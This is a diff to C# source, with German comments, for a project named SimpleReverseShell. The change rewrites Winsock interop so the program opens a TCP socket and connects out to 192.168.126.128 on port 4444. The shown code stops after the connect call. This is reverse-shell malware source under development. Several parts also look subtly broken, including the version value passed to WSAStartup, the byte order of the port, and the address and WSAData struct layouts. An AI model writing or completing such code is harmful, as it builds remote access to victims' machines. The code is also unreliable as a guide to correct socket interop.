@@ -86,8 +86,8 @@ namespace SimpleReverseShell
     /// <param name="group">Kann NULL sein.</param>
     /// <param name="dwFlags">Kann NULL sein.</param>
     /// <returns></returns>
-    [DllImport("Ws2_32.dll")]
-    public static extern IntPtr WSASocketA(int af, int type, int protocol, WSAPROTOCOL_INFOA protocolInfo, int group, int dwFlags);
+    [DllImport("Ws2_32.dll", SetLastError = true)]
+    public static extern IntPtr WSASocketA(int af, int type, int protocol, IntPtr protocolInfo, int group, int dwFlags);
 
     /// <summary>
     /// Importierte Methode um ein Socket zu connecten.
@@ -98,10 +98,24 @@ namespace SimpleReverseShell
     /// <param name="namelen">Länge der Sockaddr Struktur</param>
     /// <returns></returns>
     [DllImport("Ws2_32.dll", SetLastError = true)]
-    public static extern int connect(IntPtr socket, ref SockAddr name, int namelen);
+    public static extern int connect(IntPtr socket, IntPtr name, int namelen);
 
+    /// <summary>
+    /// Fragt den letzten Fehlercode ab. Eine Referenz zu Fehlercodes: https://learn.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
+    /// </summary>
+    /// <returns></returns>
     [DllImport("Ws2_32.dll")]
     public static extern int WSAGetLastError();
+
+    /// <summary>
+    /// Initialisiert die Sockets, dass diese verwendet werden können.
+    /// </summary>
+    /// <param name="maxVersionRequired">Die max Version der Spezifikation die benutzt wird.</param>
+    /// <param name="WSAData">Pointer auf die WSAData Struktur.</param>
+    /// Doku: https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
+    /// <returns></returns>
+    [DllImport("Ws2_32.dll")]
+    public static extern int WSAStartup(ushort maxVersionRequired, WSAData WSAData);
 
     /// <summary>
     /// Dokumentation: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa
@@ -128,7 +142,6 @@ namespace SimpleReverseShell
       int iSecurityScheme;
       int dwMessageSize;
       int dwProviderReserved;
-      [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
       char[] szProtocol;
     }
 
@@ -185,17 +198,40 @@ namespace SimpleReverseShell
     internal struct SockAddr
     {
       internal ushort sa_family;
-      internal byte[] sa_data;
+      internal long s_addr;
+      internal ushort port;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    internal struct WSAData
+    {
+      ushort wVersion;
+      ushort wHighVersion;
+      ushort iMaxSockets;
+      ushort iMaxUdpDg;
+      IntPtr lpVendorInfo;
+      byte[] szDescription;
+      byte[] szSystemStatus;
+      ushort iMaxUdpg;
     }
 
     #endregion
 
     public void Start()
     {
+      var wsa = new WSAData();
+      var statusCode = WSAStartup((ushort)2.2, wsa);
+
+      if (statusCode != 0)
+      {
+        Console.WriteLine($"WSA Startup fail with statuscode {statusCode}");
+        throw new InvalidOperationException();
+      }
+
       var protcolInfo = new WSAPROTOCOL_INFOA();
 
       var addrIn = new In_Addr();
-      addrIn.s_b1 = 128;
+      addrIn.s_b1 = 192;
       addrIn.s_b2 = 168;
       addrIn.s_b3 = 126;
       addrIn.s_b4 = 128;
@@ -207,28 +243,41 @@ namespace SimpleReverseShell
 
       var sockaddr = new SockAddr();
       sockaddr.sa_family = (ushort)sockAddrIn.s_family;
+      sockaddr.s_addr = 3232267904;
+      sockaddr.port = 4444;
 
 
-      sockaddr.sa_data = new byte[14];
-      // Copy port number (assuming it's in network byte order)
-      sockaddr.sa_data[0] = (byte)(sockAddrIn.s_port >> 8);  // High byte
-      sockaddr.sa_data[1] = (byte)(sockAddrIn.s_port & 0xFF); // Low byte
+      //sockaddr.sa_data = new byte[14];
+      //// Copy port number (assuming it's in network byte order)
+      //sockaddr.sa_data[0] = (byte)(sockAddrIn.s_port >> 8);  // High byte
+      //sockaddr.sa_data[1] = (byte)(sockAddrIn.s_port & 0xFF); // Low byte
 
-      // Copy IPv4 address
-      sockaddr.sa_data[2] = sockAddrIn.s_addr.s_b1;
-      sockaddr.sa_data[3] = sockAddrIn.s_addr.s_b2;
-      sockaddr.sa_data[4] = sockAddrIn.s_addr.s_b3;
-      sockaddr.sa_data[5] = sockAddrIn.s_addr.s_b4;
+      //// Copy IPv4 address
+      //sockaddr.sa_data[2] = sockAddrIn.s_addr.s_b1;
+      //sockaddr.sa_data[3] = sockAddrIn.s_addr.s_b2;
+      //sockaddr.sa_data[4] = sockAddrIn.s_addr.s_b3;
+      //sockaddr.sa_data[5] = sockAddrIn.s_addr.s_b4;
 
-      // Fill the rest of the sa_data array with zeros
-      for (int i = 6; i < sockaddr.sa_data.Length; i++)
+      //// Fill the rest of the sa_data array with zeros
+      //for (int i = 6; i < sockaddr.sa_data.Length; i++)
+      //{
+      //  sockaddr.sa_data[i] = 0;
+      //}
+
+      var socket = WSASocketA(2, 1, 6, IntPtr.Zero, 0, 0);
+
+      var lastError = WSAGetLastError();
+
+      if (lastError != 0)
       {
-        sockaddr.sa_data[i] = 0;
+        Console.WriteLine($"WSASocketA failed with error code {lastError}");
+        throw new InvalidOperationException();
       }
 
-
-      var socket = WSASocketA(2, 1, 6, protcolInfo, 0, 0);
-      var connectSuccess = connect(socket, ref sockaddr, Marshal.SizeOf(sockaddr));
+      IntPtr addrPointer = new IntPtr();
+      addrPointer = Marshal.AllocHGlobal(Marshal.SizeOf(sockaddr));
+      Marshal.StructureToPtr(sockaddr, addrPointer, false);
+      var connectSuccess = connect(socket, addrPointer, Marshal.SizeOf(sockaddr));
       
       if (connectSuccess != 0)
       {
